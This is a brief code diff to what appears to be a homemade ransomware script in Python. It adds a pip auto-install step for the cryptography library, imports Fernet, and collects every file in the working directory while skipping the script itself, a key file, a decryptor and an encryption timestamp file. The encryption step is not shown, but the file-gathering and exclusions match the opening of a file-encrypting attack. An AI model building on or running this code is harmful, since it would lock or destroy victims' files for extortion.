@@ -1,18 +1,19 @@
 import subprocess
 import sys
 import os
-from cryptography.fernet import Fernet
-import socket
-from datetime import datetime, timedelta
+#Install cryptography module
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-# Ejemplo de uso:
 install('cryptography')
+from cryptography.fernet import Fernet
+import socket
+from datetime import datetime, timedelta
+
 files = []
 
 for file in os.listdir():
-    if file == "voldemort.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
+    if file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
         continue
     if os.path.isfile(file):
         files.append(file)
